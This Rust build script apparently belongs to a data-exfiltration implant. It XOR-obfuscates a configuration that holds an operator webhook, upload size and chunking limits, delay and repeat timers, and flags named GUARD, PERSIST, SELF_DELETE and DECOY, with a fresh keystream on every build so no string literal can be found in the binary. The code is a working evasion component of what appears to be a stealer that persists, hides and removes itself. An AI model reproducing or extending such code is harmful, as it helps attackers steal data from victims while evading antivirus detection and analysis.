// Compiles strings.txt into XOR-obfuscated byte arrays.
//
// Each value gets its own 32-byte keystream from a xorshift64 seeded with the
// build timestamp, so two builds of the same source never share a keystream and
// no literal from strings.txt exists in the binary.
//
// strings.txt is generated by build.ps1 and holds the operator's own webhook, so
// it is not committed. Without it the build falls back to strings.example.txt
// (placeholder webhook, no delivery) and still compiles.

use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};

/// Every constant config.rs reads, so a partial config still compiles.
const REQUIRED: &[&str] = &[
    "WEBHOOK",
    "APP_NAME",
    "DELAY_MINUTES",
    "RETRY_MINUTES",
    "REPEAT_HOURS",
    "MAX_UPLOAD_MB",
    "CHUNK_MB",
    "GUARD",
    "PERSIST",
    "SELF_DELETE",
    "DECOY",
];

fn main() {
    println!("cargo:rerun-if-changed=strings.txt");
    println!("cargo:rerun-if-changed=strings.example.txt");
    println!("cargo:rerun-if-changed=build.rs");

    let out_dir = PathBuf::from(std::env::var("OUT_DIR").expect("OUT_DIR"));
    let text = fs::read_to_string("strings.txt")
        .or_else(|_| fs::read_to_string("strings.example.txt"))
        .unwrap_or_default();
    let text = text.trim_start_matches('\u{feff}');

    let mut seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x9e37_79b9_7f4a_7c15)
        | 1;

    let mut values: Vec<(String, String)> = Vec::new();

    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let name: String = key
            .trim()
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_uppercase() } else { '_' })
            .collect();
        if name.is_empty() || values.iter().any(|(existing, _)| existing == &name) {
            continue;
        }
        values.push((name, value.trim().to_string()));
    }

    for key in REQUIRED {
        if !values.iter().any(|(name, _)| name == key) {
            values.push((key.to_string(), String::new()));
        }
    }

    let mut out = String::from("// generated by build.rs\n");
    let count = values.len();

    for (name, value) in &values {
        let mut keystream = [0u8; 32];
        for slot in keystream.iter_mut() {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            *slot = (seed >> 24) as u8;
        }

        let encoded: Vec<u8> = value
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ keystream[i % 32])
            .collect();

        out.push_str(&format!(
            "pub const {name}: (&[u8], &[u8]) = (&{encoded:?}, &{keystream:?});\n"
        ));
    }

    let target = out_dir.join("strings.rs");
    let mut fh = fs::File::create(&target).expect("write strings.rs");
    fh.write_all(out.as_bytes()).expect("write strings.rs");
    println!("cargo:warning=obfuscated {count} constants into {target:?}");
}
